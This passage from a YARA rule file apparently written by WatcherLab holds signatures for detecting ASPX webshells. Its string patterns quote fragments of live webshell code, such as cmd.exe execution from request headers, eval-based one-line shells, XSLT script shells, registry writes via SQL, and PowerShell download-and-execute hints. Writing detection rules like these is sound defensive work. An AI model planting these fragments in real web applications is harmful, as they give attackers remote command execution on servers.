        $x6 = "<asp:TextBox ID=\"cmdurl\" runat=\"server\" Width=\"320px\" Font-Size=\"12px\">cmd.exe</asp:TextBox></td>" fullword ascii
        $x7 = "string agentsql = \"EXEC sp_add_job @job_name = 'jktest',\" + \" @enabled = 1,\" + \" @delete_level = 1\" + \" EXEC sp_add_jobst" ascii
        $x8 = "agentcmd.ExecuteNonQuery();" fullword ascii
        $x9 = "SqlDataReader jkkudr = getocmd.ExecuteReader();" fullword ascii
        $x10 = "SqlDataReader jksdr = getocmd.ExecuteReader();" fullword ascii
        $x11 = "SqlDataReader deldr = getocmd.ExecuteReader();" fullword ascii
        $x12 = "string jksql4 = jksql3 + \"select * from openrowset('microsoft.jet.oledb.4.0',';database=c:\\\\windows\\\\system32" fullword ascii
        $x13 = "SqlConnection getpconn = new SqlConnection(\"server=.\" + oportstr + \";User ID=\" + osqlnamestr + \";Password=\" + osqlpassst" fullword ascii
        $x14 = "string connstrs = \"server=.\" + getport + \";User ID=\" + sqlname.Text.Trim() + \";Password=\" + sqlpass.Text.Trim() + \";d" fullword ascii
        $x15 = "string agentsql = \"EXEC sp_add_job @job_name = 'jktest',\" + \" @enabled = 1,\" + \" @delete_level = 1\" + \" EXEC sp_add_jobst" ascii
        $x16 = "string connstr = \"server=.\" + getport + \";User ID=\" + sqlname.Text.Trim() + \";Password=\" + sqlpass.Text.Trim(" fullword ascii
        $x17 = "getocmd.ExecuteNonQuery();           " fullword ascii
        $x18 = "SqlConnection conn = new SqlConnection(\"server=.\" + kp + \";User ID=\" + kusqlname.Text + \";Password=\" + kusqlpass.Tex" fullword ascii
        $x19 = "File.SetAttributes(fileconfigpath.Text.ToString(), File.GetAttributes(fileconfigpath.Text) | FileAttributes.System);" fullword ascii
        $x20 = "string sayx = \"exec master.dbo.xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image" ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 300KB and ( 1 of ($x*) ) ) or ( all of them )
}

rule c730a1e20077351ccce16178ed9a14d0baef1314
{
    meta:
        description = "aspx - file c730a1e20077351ccce16178ed9a14d0baef1314.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "856f45ee3c3cb1f86285f7fe788e3ef7e8bb6f7f79b3aa839a95adde88a09de8"
    strings:
        $s1 = "<msxsl:assembly name=\"\"System.Configuration, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a\"\"/>" fullword ascii
        $s2 = "<msxsl:assembly name=\"\"System.Data, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\"\"/>" fullword ascii
        $s3 = "<msxsl:assembly name=\"\"System.Web, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a\"\"/>" fullword ascii
        $s4 = "<msxsl:assembly name=\"\"mscorlib, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\"\"/>" fullword ascii
        $s5 = "<xsl:template match=\"\"/root\"\">" fullword ascii
        $s6 = "<%@ import Namespace=\"System.Xml.Xsl\"%>" fullword ascii
        $s7 = "string xml=@\"<?xml version=\"\"1.0\"\"?><root>test</root>\";" fullword ascii
        $s8 = "<%@ import Namespace=\"System.Xml\"%>" fullword ascii
        $s9 = "eval(Request.Item['a'],'unsafe');Response.End();}]]>" fullword ascii
        $s10 = "<msxsl:script language=\"\"JScript\"\" implements-prefix=\"\"zcg\"\">" fullword ascii
        $s11 = "<![CDATA[function xml() {var c=System.Web.HttpContext.Current;var Request=c.Request;var Response=c.Response;var Server=c.Server;" ascii
        $s12 = "xct.Load(xsldoc,XsltSettings.TrustedXslt,new XmlUrlResolver());" fullword ascii
        $s13 = "XslCompiledTransform xct=new XslCompiledTransform();" fullword ascii
        $s14 = "<xsl:stylesheet version=\"\"1.0\"\" xmlns:xsl=\"\"http://www.w3.org/1999/XSL/Transform\"\" xmlns:msxsl=\"\"urn:schemas-microsoft" ascii
        $s15 = "<xsl:stylesheet version=\"\"1.0\"\" xmlns:xsl=\"\"http://www.w3.org/1999/XSL/Transform\"\" xmlns:msxsl=\"\"urn:schemas-microsoft" ascii
        $s16 = "<![CDATA[function xml() {var c=System.Web.HttpContext.Current;var Request=c.Request;var Response=c.Response;var Server=c.Server;" ascii
        $s17 = "xct.Transform(xmldoc,null,new MemoryStream());" fullword ascii
        $s18 = "string xslt=@\"<?xml version='1.0'?>" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 4KB and ( 8 of them ) ) or ( all of them )
}

rule d9cf48075372ce88e95f4cb91478e315a70412f6
{
    meta:
        description = "aspx - file d9cf48075372ce88e95f4cb91478e315a70412f6.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "58129107797ebb2e43b10504e65ee065d91a859fb27fa23b26ecb50649774281"
    strings:
        $s1 = "si.StartInfo.FileName = \"cmd.exe\";" fullword ascii
        $s2 = "System.Diagnostics.Process si = new System.Diagnostics.Process();" fullword ascii
        $s3 = "si.StartInfo.UseShellExecute = false;" fullword ascii
        $s4 = "<form id=\"Form\" method=\"post\" runat=\"server\">" fullword ascii
        $s5 = "si.StartInfo.Arguments = \"/c \"+Request.Headers[\"e1044\"];" fullword ascii
        $s6 = "si.StartInfo.WorkingDirectory = \"c:\\\\\";" fullword ascii
        $s7 = "if (Request.Headers[\"e1044\"] != null){" fullword ascii
        $s8 = "<asp:Label id=\"result\" runat=\"server\" Visible=false />" fullword ascii
        $s9 = "si.StartInfo.RedirectStandardError = true;" fullword ascii
        $s10 = "string output = si.StandardOutput.ReadToEnd();" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 2KB and ( all of them ) ) or ( all of them )
}

rule sig_7c1d56b90e387d816ae61e11a37ee93359113c9d
{
    meta:
        description = "aspx - file 7c1d56b90e387d816ae61e11a37ee93359113c9d.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "b0a31a7937be01fb4fe8705344b32bc0a7b3733639c615a3b400d3fc1bd1d7e3"
    strings:
        $s1 = "sqlCommand.Parameters.Add(((TableCell)dataGridItem.Controls[0]).Text, SqlDbType.DateTime).Value = ((Text" fullword ascii
        $s2 = "<asp:Button id=\"btnExecute\" onclick=\"btnExecute_Click\" runat=\"server\" Text=\"Execute Query\"></asp:Button>" fullword ascii
        $s3 = "sqlCommand.Parameters.Add(((TableCell)dataGridItem.Controls[0]).Text, SqlDbType.Real).Value = ((TextBox)" fullword ascii
        $s4 = "sqlCommand.Parameters.Add(((TableCell)dataGridItem.Controls[0]).Text, SqlDbType.SmallInt).Value = ((Text" fullword ascii
        $s5 = "sqlCommand.Parameters.Add(((TableCell)dataGridItem.Controls[0]).Text, SqlDbType.TinyInt).Value = uint.Pa" fullword ascii
        $s6 = "sqlCommand.Parameters.Add(((TableCell)dataGridItem.Controls[0]).Text, SqlDbType.Decimal).Value = decimal" fullword ascii
        $s7 = "sqlCommand.Parameters.Add(((TableCell)dataGridItem.Controls[0]).Text, SqlDbType.Bit).Value = ((TextBox)d" fullword ascii
        $s8 = "sqlCommand.Parameters.Add(((TableCell)dataGridItem.Controls[0]).Text, SqlDbType.BigInt).Value = ((TextBo" fullword ascii
        $s9 = "sqlCommand.Parameters.Add(((TableCell)dataGridItem.Controls[0]).Text, SqlDbType.NChar).Value = ((TextBox" fullword ascii
        $s10 = "sqlCommand.Parameters.Add(((TableCell)dataGridItem.Controls[0]).Text, SqlDbType.Float).Value = float.Par" fullword ascii
        $s11 = "sqlCommand.Parameters.Add(((TableCell)dataGridItem.Controls[0]).Text, SqlDbType.Int).Value = ((TextBox)d" fullword ascii
        $s12 = "sqlCommand.Parameters.Add(\"@procedure_name\", SqlDbType.NVarChar, 390).Value = cboSps.SelectedItem.Value;" fullword ascii
        $s13 = "<asp:Button id=\"btnExecute\" onclick=\"btnExecute_Click\" runat=\"server\" Text=\"Execute Query\"></asp:But" fullword ascii
        $s14 = "sqlCommand.Parameters.Add(((TableCell)dataGridItem.Controls[0]).Text, SqlDbType.NVarChar, int.Parse(((Ta" fullword ascii
        $s15 = "sqlCommand.Parameters.Add(((TableCell)dataGridItem.Controls[0]).Text, SqlDbType.VarChar, int.Parse(((Tab" fullword ascii
        $s16 = "sqlCommand.Parameters.Add(((TableCell)dataGridItem.Controls[0]).Text, SqlDbType.Char, int.Parse(((TableC" fullword ascii
        $s17 = "sqlCommand.Parameters.Add(((TableCell)dataGridItem.Controls[0]).Text, SqlDbType.NText, int.Parse(((Table" fullword ascii
        $s18 = "sqlCommand.Parameters[((TableCell)dataGridItem.Controls[0]).Text].Direction = ParameterDirection.InputOutput;" fullword ascii
        $s19 = "sqlCommand.CommandType = CommandType.StoredProcedure;" fullword ascii
        $s20 = "<asp:Button id=\"btnGetParams\" onclick=\"btnGetParameters_Click\" runat=\"server\" Text=\"Get Parameters\"></asp:Button>" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 40KB and ( 8 of them ) ) or ( all of them )
}

rule sig_11878e3e6b6716691995caead4c38ba5ea743ea8
{
    meta:
        description = "aspx - file 11878e3e6b6716691995caead4c38ba5ea743ea8.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "9b0489c08bc4df8709bd5207f3f2520f7f066ac06a48145a331e58cc9eb2a472"
    strings:
        $x1 = "Process p1 = Process.Start(\"\\\"\" + txtRarPath.Value + \"\\\"\", \" a -y -k -m5 -ep1 -o+ -s \\\"\" + txtOutPath.Value " fullword ascii
        $s2 = "if (_Debug) System.Console.WriteLine(\"\\ninserting filename into CDS: (length= {0})\", Header.Length - 30);" fullword ascii
        $s3 = "Console.WriteLine(\"{0}: truncating dump from {1} to {2} bytes...\", TargetFile, _FileData.Length," fullword ascii
        $s4 = "Console.WriteLine(\"{0}: truncating dump from {1} to {2} bytes...\", TargetFile, _FileData.Length, n);" fullword ascii
        $s5 = "System.DateTime AdjustedTime = entry._LastModified - new System.TimeSpan(1, 0, 0);" fullword ascii
        $s6 = "TargetFile = System.IO.Path.Combine(basedir, FileName);" fullword ascii
        $s7 = "Process p1 = Process.Start(\"\\\"\" + txtRarPath.Value + \"\\\"\", \" a -y -k -m5 -ep1 -o+ -s \\\"\" + txtOutPath.Value + \".Rar" ascii
        $s8 = "UInt16 packedDate = (UInt16)((time.Day & 0x0000001F) | ((time.Month << 5) & 0x000001E0) | (((time.Year - 1980) << 9)" fullword ascii
        $s9 = "Console.WriteLine(\"{0}: memstream.Position: {1}\", TargetFile, memstream.Position);" fullword ascii
        $s10 = "input = new System.IO.Compression.DeflateStream(memstream, System.IO.Compression.CompressionMode.Decompr" fullword ascii
        $s11 = "input = new System.IO.Compression.DeflateStream(memstream, System.IO.Compression.CompressionMode.Decompress);" fullword ascii
        $s12 = "System.IO.Directory.CreateDirectory(System.IO.Path.GetDirectoryName(TargetFile));" fullword ascii
        $s13 = "Console.WriteLine(\"{0}: _FileData.Length= {1}\", TargetFile, _FileData.Length);" fullword ascii
        $s14 = "String k8time = k8currentime.Date.ToShortDateString() + \"_\" + k8currentime.Hour.ToString() + \"_\" + k8currentime.Minute.T" fullword ascii
        $s15 = "if (!System.IO.Directory.Exists(System.IO.Path.GetDirectoryName(TargetFile)))" fullword ascii
        $s16 = "output = new System.IO.FileStream(TargetFile, System.IO.FileMode.CreateNew);" fullword ascii
        $s17 = "return 100 * (1.0 - (1.0 * CompressedSize) / (1.0 * UncompressedSize));" fullword ascii
        $s18 = "System.IO.File.SetLastWriteTime(TargetFile, AdjustedLastModified);" fullword ascii
        $s19 = "// the Data Descriptor, and presume that that signature does not appear in the (compressed) data of the compressed file.  " fullword ascii
        $s20 = "CompressedStream.Close();  // to get the footer bytes written to the underlying stream" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_898ebfa1757dcbbecb2afcdab1560d72ae6940de
{
    meta:
        description = "aspx - file 898ebfa1757dcbbecb2afcdab1560d72ae6940de.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "ba08d9125617307e4f8235f02cf1d5928374eea275456914e51d8a367657d10c"
    strings:
        $x1 = "Call oScript.Run (\"cmd.exe /c \" & cmd_to_execute & \" > \" & tempFile, 0, True)" fullword ascii
        $x2 = "errReturn = WinExec(Target_copy_of_cmd + \" /c \" + command + \"  > \" + tempFile , 10)" fullword ascii
        $x3 = "<p> Execute command with ASP.NET account using W32(<span class=\"style3\">Notice: only click &quot;Run&quot; to run</span>)</p" fullword ascii
        $x4 = "<p> Execute command with ASP.NET account using WSH(<span class=\"style3\">Notice: only click &quot;Run&quot; to run</span>)</p>" fullword ascii
        $x5 = "<p> Execute command with ASP.NET account using WSH(<span class=\"style3\">Notice: only click &quot;Run&quot; to run</span>)</p" fullword ascii
        $x6 = "<p> Execute command with ASP.NET account using W32(<span class=\"style3\">Notice: only click &quot;Run&quot; to run</span>)</p>" fullword ascii
        $x7 = "<p> Execute command with ASP.NET account(<span class=\"style3\">Notice: only click &quot;Run&quot; to run</span>)</p>" fullword ascii
        $x8 = "'       objProcessInfo = winObj.ExecQuery(\"Select \"+Fields_to_Show+\" from \" + Wmi_Function)                 " fullword ascii
        $x9 = "objProcessInfo = winObj.ExecQuery(\"Select \"+Fields_to_Show+\" from \" + Wmi_Function)                 " fullword ascii
        $x10 = "'local_copy_of_cmd= \"C:\\\\WINDOWS\\\\system32\\\\cmd.exe\"" fullword ascii
        $x11 = "Sub ExecuteCommand1(command As String, tempFile As String,cmdfile As String)" fullword ascii
        $x12 = "Dim kProcessStartInfo As New ProcessStartInfo(\"cmd.exe\")" fullword ascii
        $x13 = "<p> Execute command with SQLServer account(<span class=\"style3\">Notice: only click \"Run\" to run</span>)</p>" fullword ascii
        $x14 = "Declare Function WinExec Lib \"kernel32\" Alias \"WinExec\" (ByVal lpCmdLine As String, ByVal nCmdShow As Long) As Long" fullword ascii
        $x15 = "Target_copy_of_cmd = Environment.GetEnvironmentVariable(\"Temp\")+\"\\kiss.exe\"" fullword ascii
        $x16 = "Function ExecuteCommand2(cmd_to_execute, tempFile)" fullword ascii
        $s17 = "ExecuteCommand1(command,tempFile,txtCmdFile.Text)" fullword ascii
        $s18 = "System.Web.Mail.SmtpMail.Send(request.ServerVariables(\"HTTP_HOST\"),\"test.mail.address.2008@gmail.com\",request.ServerVariable" ascii
        $s19 = "System.Web.Mail.SmtpMail.Send(request.ServerVariables(\"HTTP_HOST\"),\"test.mail.address.2008@gmail.com\",request.ServerVariable" ascii
        $s20 = "&nbsp;&nbsp; &nbsp; --- &nbsp;End Ip : &nbsp;<asp:TextBox ID=\"txtEndIP\" runat=\"server\" Width=\"185px\">127.0.0.1</asp:Text" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( 1 of ($x*) and all of them ) ) or ( all of them )
}

rule cdbdb41dfe363931aad365152a912e251893e715
{
    meta:
        description = "aspx - file cdbdb41dfe363931aad365152a912e251893e715.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "536839129ca2c6b8526321e8e607c50ee1672d1adf18ee432d8667a0a0f3ab40"
    strings:
        $s1 = "< %@ Page Language=\"Jscript\" validateRequest=\"false\" %><%Response.Write(eval(Request.Item[\"w\"],\"unsafe\"));%>" fullword ascii
    condition:
        ( uint16(0) == 0x203c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_09d35414182fcfbafc382cfd9f9054130bab16b3
{
    meta:
        description = "aspx - file 09d35414182fcfbafc382cfd9f9054130bab16b3.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "7f08aa57086d0f2ba2f1f7a3b1c26a729bbe17f9de3776e31a0f3ba15a3ecae4"
    strings:
        $x1 = "System.Data.SqlClient.SqlCommand cmd = new System.Data.SqlClient.SqlCommand(sqlStr, connection);" fullword ascii
        $s2 = "System.Data.Common.DbDataReader dr= comm.ExecuteReader();" fullword ascii
        $s3 = "System.Data.Common.DbProviderFactory factory = System.Data.Common.DbProviderFactories.GetFactory(provoder);" fullword ascii
        $s4 = "//System.Data.SqlClient.SqlDataReader dr = comm.ExecuteReader();" fullword ascii
        $s5 = "System.Data.SqlClient.SqlCommand comm = new System.Data.SqlClient.SqlCommand(" fullword ascii
        $s6 = "System.Data.SqlClient.SqlDataAdapter da = new System.Data.SqlClient.SqlDataAdapter(cmd);" fullword ascii
        $s7 = "System.Data.SqlClient.SqlConnection connection = new System.Data.SqlClient.SqlConnection(connectionString);" fullword ascii
        $s8 = "System.Data.Common.DbCommand comm = conn.CreateCommand();" fullword ascii
        $s9 = "using (System.Data.SqlClient.SqlConnection conn = new System.Data.SqlClient.SqlConnection(connT.Text.ToString()))" fullword ascii
        $s10 = "//            System.Data.SqlClient.SqlCommand comm = new System.Data.SqlClient.SqlCommand(Request[\"sql\"], conn);" fullword ascii
        $s11 = "System.Data.Common.DbConnection conn=factory.CreateConnection() ;" fullword ascii
        $s12 = "//using (System.Data.OleDb.OleDbConnection conn = new System.Data.OleDb.OleDbConnection(connT.Text.ToString()))" fullword ascii
        $s13 = "using (System.Data.OleDb.OleDbConnection conn = new System.Data.OleDb.OleDbConnection(connT.Text.ToString()))" fullword ascii
        $s14 = "using (System.Data.Odbc.OdbcConnection conn = new System.Data.Odbc.OdbcConnection(connT.Text.ToString()))" fullword ascii
        $s15 = "//            System.Data.Odbc.OdbcCommand comm = new System.Data.Odbc.OdbcCommand(Request[\"sql\"], conn);" fullword ascii
        $s16 = "//            System.Data.OleDb.OleDbCommand comm = new System.Data.OleDb.OleDbCommand(Request[\"sql\"], conn);" fullword ascii
        $s17 = "DropDownList2.Items.Add(new ListItem(item[\"TABLE_NAME\"].ToString(), item[\"TABLE_NAME\"].ToString()));" fullword ascii
        $s18 = "System.Data.DataTable dt = conn.GetSchema(" fullword ascii
        $s19 = "System.Data.SqlClient.SqlDataAdapter ad = new System.Data.SqlClient.SqlDataAdapter();" fullword ascii
        $s20 = "comm.CommandText = Request[\"sql\"];" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 60KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_9fcd8c3093e933b34c4faae4f1f58b4738eba252
{
    meta:
        description = "aspx - file 9fcd8c3093e933b34c4faae4f1f58b4738eba252.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "4f6fa6a45017397c7e1c9cd5a17235ccb1ff0f5087dfa6b7384552bf507e7fe1"
    strings:
        $x1 = "//http://www.darkoperator.com/blog/2013/3/21/powershell-basics-execution-policy-and-code-signing-part-2.html" fullword ascii
        $x2 = "output.Text = @\"Use this shell as a normal powershell console. Each command is executed in a new process, keep this in m" fullword ascii
        $x3 = "output.Text = @\"Use this shell as a normal powershell console. Each command is executed in a new process, keep this in mind" fullword ascii
        $x4 = "1. Paste the script in command textbox and click 'Encode and Execute'. A reasonably large script could be executed using this." fullword ascii
        $x5 = "Executing PowerShell scripts on the target - " fullword ascii
        $x6 = "2. Use powershell one-liner (example below) for download & execute in the command box." fullword ascii
        $s7 = "psi.Arguments = \"-noninteractive \" + \"-executionpolicy bypass \" + arg;" fullword ascii
        $s8 = "Response.AppendHeader(\"Content-Disposition\", \"attachment; filename=\" + console.Text);" fullword ascii
        $s9 = "<asp:Button ID=\"encode\" runat=\"server\" Text=\"Encode and Execute\" OnClick=\"base64encode\" />" fullword ascii
        $s10 = "while using commands (like changing current directory or running session aware scripts). " fullword ascii
        $s11 = "output.Text = \"Upload status: The file could not be uploaded. The following error occured: \" + ex.Message;" fullword ascii
        $s12 = "string command = \"Invoke-Expression $(New-Object IO.StreamReader (\" +" fullword ascii
        $s13 = "To upload a file you must mention the actual path on server (with write permissions) in command textbox. " fullword ascii
        $s14 = "To download a file enter the actual path on the server in command textbox." fullword ascii
        $s15 = "//This section based on cmdasp webshell by http://michaeldaw.org" fullword ascii
        $s16 = "<asp:Button ID=\"downloadbutton\" runat=\"server\" Text=\"Download\" OnClick=\"downloadbutton_Click\" />" fullword ascii
        $s17 = "3. By uploading the script to the target and executing it." fullword ascii
        $s18 = "(OS temporary directory like C:\\Windows\\Temp may be writable.)" fullword ascii
        $s19 = "http://www.labofapenetrationtester.com/2014/06/introducing-antak.html" fullword ascii
        $s20 = "void execcommand(string cmd)" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 20KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule d5bfe40283a28917fcda0cefd2af301f9a7ecdad
{
    meta:
        description = "aspx - file d5bfe40283a28917fcda0cefd2af301f9a7ecdad.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "a350ca8e276a0d6f788ecea1b826e089a63df84b53ba92c9f13e701c70d6781e"
    strings:
        $x1 = "Copyright &copy; 2009 Bin -- <a href=\"http://www.rootkit.net.cn\" target=\"_blank\">www.rootkit.net.cn</a>" fullword ascii
        $x2 = "href=\"http://drvfan.com\" target=\"_blank\">Yf4n'Blog</a> All Rights Reserved.</div></div>" fullword ascii
        $s3 = "<div style=\"padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#eee;\">Copyright &copy; 2006-2009 <" ascii
        $s4 = "Bin_Button_KillMe.Attributes[\"onClick\"]=\"if(confirm('Are you sure delete ASPXSPY?')){Bin_PostBack('hae','');};\";" fullword ascii
        $s5 = "<td ><span style=\"float:right;\"><a href=\"http://www.rootkit.net.cn\" target=\"_blank\">ASPXSpy Ver: 2009</a></span><span id=" ascii
        $s6 = "<td ><span style=\"float:right;\"><a href=\"http://www.rootkit.net.cn\" target=\"_blank\">ASPXSpy Ver: 2009</a></span><span id=" ascii
        $s7 = "public string Password=\"0ecf008d38a8fc4e63c73aea55c62cf7\";//NI610B" fullword ascii
        $s8 = "an_Sname\" runat=\"server\" enableviewstate=\"true\"></span></td>" fullword ascii
        $s9 = "<title>ASPXspy</title>" fullword ascii
    condition:
        ( uint16(0) == 0xbbef and filesize < 200KB and ( 1 of ($x*) and all of them ) ) or ( all of them )
}

rule sig_8a8d17de16a4a015460767707d9962ba1da6bfbb
{
    meta:
        description = "aspx - file 8a8d17de16a4a015460767707d9962ba1da6bfbb.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "26d0734586fafa5bc6e1cca1761711b5d4e51605f13125e00b0c299316e561cd"
    strings:
        $s1 = "<msxsl:assembly name=\"System.Configuration, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a\"/>" fullword ascii
        $s2 = "<msxsl:assembly name=\"System.Data, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\"/>" fullword ascii
        $s3 = "<msxsl:assembly name=\"System.Web, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a\"/>" fullword ascii
        $s4 = "function xml() {var c=System.Web.HttpContext.Current;var Request=c.Request;var Response=c.Response;var Server=c.Server;eval(" fullword ascii
        $s5 = "<msxsl:assembly name=\"mscorlib, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\"/>" fullword ascii
        $s6 = "<xsl:template match=\"/root\">" fullword ascii
        $s7 = "function xml() {var c=System.Web.HttpContext.Current;var Request=c.Request;var Response=c.Response;var Server=c.Server;eval(Requ" ascii
        $s8 = "Request.Item['a'],'unsafe');Response.End();}" fullword ascii
        $s9 = "<msxsl:script language=\"JScript\" implements-prefix=\"zcg\">" fullword ascii
        $s10 = "<xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:msxsl=\"urn:schemas-microsoft-com:xslt" ascii
        $s11 = "<xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:msxsl=\"urn:schemas-microsoft-com:xslt" ascii
    condition:
        ( uint16(0) == 0x3f3c and filesize < 2KB and ( 8 of them ) ) or ( all of them )
}

rule e24156578cd92887302fb01a801d84dd9da58d51
{
    meta:
        description = "aspx - file e24156578cd92887302fb01a801d84dd9da58d51.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "edb7873e1d8e27b8cedeec53a78aed2d9c70c4576f1bdf57d1012f521833bc48"
    strings:
        $s1 = "GetString(System.Convert.FromBase64String(\"UmVxdWVzdC5JdGVtWyJ6Il0=\"))));" fullword ascii
        $s2 = "popup(popup(System.Text.Encoding.GetEncoding(65001)." fullword ascii
        $s3 = "password:z" fullword ascii
        $s4 = "<script runat=\"server\" language=\"JScript\">" fullword ascii
    condition:
        ( uint16(0) == 0x733c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule fe8298914b2a919864818a0586522553575b87d3
{
    meta:
        description = "aspx - file fe8298914b2a919864818a0586522553575b87d3.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "af1c00696243f8b062a53dad9fb8b773fa1f0395631ffe6c7decc42c47eedee7"
    strings:
        $x1 = "<%-- ASPX Shell by LT <lt@mac.hush.com> (2007) --%>" fullword ascii
        $s2 = "lblCmdOut.Text = p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();" fullword ascii
        $s3 = "p.StartInfo.FileName = \"cmd.exe\";" fullword ascii
        $s4 = "<asp:Button runat=\"server\" ID=\"cmdExec\" Text=\"Execute\" />" fullword ascii
        $s5 = "string fstr = string.Format(\"<a href='?get={0}' target='_blank'>{1}</a>\"," fullword ascii
        $s6 = "p.StartInfo.UseShellExecute = false;" fullword ascii
        $s7 = "HttpUtility.UrlEncode(dir + \"/\" + curfile.Name)," fullword ascii
        $s8 = "HttpUtility.UrlEncode(dir + \"/\" + curdir.Name)," fullword ascii
        $s9 = "HttpUtility.UrlEncode(dir + \"/\" + curfile.Name));" fullword ascii
        $s10 = "<asp:Button runat=\"server\" ID=\"cmdUpload\" Text=\"Upload\" />" fullword ascii
        $s11 = "if ((Request.QueryString[\"get\"] != null) && (Request.QueryString[\"get\"].Length > 0))" fullword ascii
        $s12 = "HttpUtility.HtmlEncode(driveRoot));" fullword ascii
        $s13 = "HttpUtility.UrlEncode(driveRoot)," fullword ascii
        $s14 = "<%@ Import Namespace=\"System.Web.UI.WebControls\" %>" fullword ascii
        $s15 = "<b><asp:Literal runat=\"server\" ID=\"lblPath\" Mode=\"passThrough\" /></b>" fullword ascii
        $s16 = "<pre><asp:Literal runat=\"server\" ID=\"lblCmdOut\" Mode=\"Encode\" /></pre>" fullword ascii
        $s17 = "string driveRoot = curdrive.RootDirectory.Name.Replace(\"\\\\\", \"\");" fullword ascii
        $s18 = "Response.WriteFile(Request.QueryString[\"get\"]);" fullword ascii
        $s19 = "// exec cmd ?" fullword ascii
        $s20 = "<asp:Literal runat=\"server\" ID=\"lblDrives\" Mode=\"PassThrough\" />" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 10KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_8e242c40aabba48687cfb135b51848af4f2d389d
{
    meta:
        description = "aspx - file 8e242c40aabba48687cfb135b51848af4f2d389d.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "3ce7a39a73e3c22bd0b5d2f84d39497f847212496df56b20f7f3492dc1a64794"
    strings:
        $x1 = "7347234.txt\", \"\"), \"\") + \"\\\" target=\\\"_blank\\\">\" + txtSavePath.Value + \"</a>\";" fullword ascii
        $x2 = "Session[\"exportinfo\"] = \"<a href=\\\"\" + txtSavePath.Value.Replace(Server.MapPath(\"now27347234.txt\").Replace(\"now2" fullword ascii
        $s3 = "connString = string.Format(\"Host = {0}; UserName = {1}; Password = {2}; Database = {3}; Port = {4};CharSet={5};Allow Zer" fullword ascii
        $s4 = "connString = string.Format(\"Host = {0}; UserName = {1}; Password = {2}; Database = {3}; Port = {4};CharSet={5};Allow" fullword ascii
        $s5 = "txtpassword.Attributes.Add(\"onkeydown\", \"SubmitKeyClick('btnLogin');\");" fullword ascii
        $s6 = "Response.AddHeader(\"Content-Disposition\", \"attachment;filename=\" + filename);" fullword ascii
        $s7 = "Session[\"exportinfo\"] = \"<a href=\\\"\" + txtSavePath.Value.Replace(Server.MapPath(\"now27347234.txt\").Replace(\"now27347234" ascii
        $s8 = "infosb.Append(sqldumptable(tableArr[i].Trim()) + \"\\n\\n\\n\\n\\n\\n\");" fullword ascii
        $s9 = "Rewrite Powered by <a href=\"http://blackbap.org\" target=\"_blank\">blackbap.org</a>" fullword ascii
        $s10 = "Response.Redirect(Request.ServerVariables[\"Script_Name\"] + \"?action=exportsucc\", true);" fullword ascii
        $s11 = "document.getElementById(\"btnLogin\").click();" fullword ascii
        $s12 = "string filename = Request.ServerVariables[\"HTTP_HOST\"] + \"MySQL.sql\";" fullword ascii
        $s13 = "Response.Redirect(Request.ServerVariables[\"Script_Name\"] + \"?action=show&tblname=\" + tblname, true);" fullword ascii
        $s14 = "<input name=\"password\" type=\"password\" size=\"20\" id=\"txtpassword\" runat=\"server\">&nbsp;" fullword ascii
        $s15 = "<asp:Panel ID=\"PanelLogin\" runat=\"server\" Visible=\"false\"  DefaultButton=\"btnLogin\">" fullword ascii
